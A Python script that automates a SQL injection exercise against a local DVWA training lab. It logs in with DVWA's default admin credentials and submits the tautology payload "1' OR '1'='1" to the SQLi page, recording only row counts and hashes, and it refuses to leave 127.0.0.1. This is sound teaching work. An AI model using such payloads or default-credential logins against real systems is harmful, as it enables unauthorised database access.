"""Fixed local DVWA exercise. Initialize DVWA first; no target discovery or arbitrary URL."""

import argparse
import hashlib
import json
import re
from datetime import datetime, timezone
from html.parser import HTMLParser
from http.cookiejar import CookieJar
from pathlib import Path
from urllib.parse import urlencode, urlsplit
from urllib.request import (
    HTTPCookieProcessor,
    HTTPRedirectHandler,
    ProxyHandler,
    Request,
    build_opener,
)

ORIGIN = "http://127.0.0.1:4280"


class LocalRedirect(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        parsed = urlsplit(newurl)
        if (parsed.scheme, parsed.netloc) != ("http", "127.0.0.1:4280"):
            raise ValueError("Redirect outside the local DVWA origin rejected")
        return super().redirect_request(req, fp, code, msg, headers, newurl)


class TokenParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.token = None

    def handle_starttag(self, tag, attrs):
        data = dict(attrs)
        if tag == "input" and data.get("name") == "user_token":
            self.token = data.get("value")


def fetch(opener, path, data=None):
    raw = None if data is None else urlencode(data).encode()
    with opener.open(Request(ORIGIN + path, data=raw), timeout=10) as response:
        return response.status, response.read(500000).decode("utf-8", errors="replace")


def summarize(status, html):
    # Never persist session cookies, login CSRF token or whole page.
    return {
        "status": status,
        "first_name_rows": len(re.findall(r"First name:", html, re.I)),
        "body_sha256": hashlib.sha256(html.encode()).hexdigest(),
    }


def main(argv=None):
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--output", type=Path, required=True)
    args = parser.parse_args(argv)
    try:
        opener = build_opener(ProxyHandler({}), HTTPCookieProcessor(CookieJar()), LocalRedirect())
        _, page = fetch(opener, "/login.php")
        tokens = TokenParser()
        tokens.feed(page)
        if not tokens.token:
            raise ValueError(
                "No login token; initialize DVWA at /setup.php and check image/version"
            )
        _, page = fetch(
            opener,
            "/login.php",
            {
                "username": "admin",
                "password": "password",
                "Login": "Login",
                "user_token": tokens.token,
            },
        )
        if "logout.php" not in page:
            raise ValueError("Teaching login failed; initialize default lab data in the UI")
        records = []
        for value in ("1", "1' OR '1'='1"):
            query = urlencode({"id": value, "Submit": "Submit"})
            status, page = fetch(opener, "/vulnerabilities/sqli/?" + query)
            records.append(
                {
                    "method": "GET",
                    "path": "/vulnerabilities/sqli/",
                    "id": value,
                    "observation": summarize(status, page),
                }
            )
        passed = (
            records[0]["observation"]["first_name_rows"] == 1
            and records[1]["observation"]["first_name_rows"] > 1
        )
        evidence = {
            "source": "local-dvwa-http",
            "created_at": datetime.now(timezone.utc).isoformat(),
            "origin": ORIGIN,
            "records": records,
            "observed_low_level_pattern": passed,
            "limitation": "这里只证明教学查询返回行数变化，不证明真实业务影响或所有SQLi类型。",
        }
        args.output.parent.mkdir(parents=True, exist_ok=True)
        args.output.write_text(json.dumps(evidence, ensure_ascii=False, indent=2) + "\n")
        print(json.dumps(evidence, ensure_ascii=False, indent=2))
        return 0 if passed else 1
    except (OSError, ValueError) as exc:
        print(f"DVWA exercise stopped: {exc}")
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
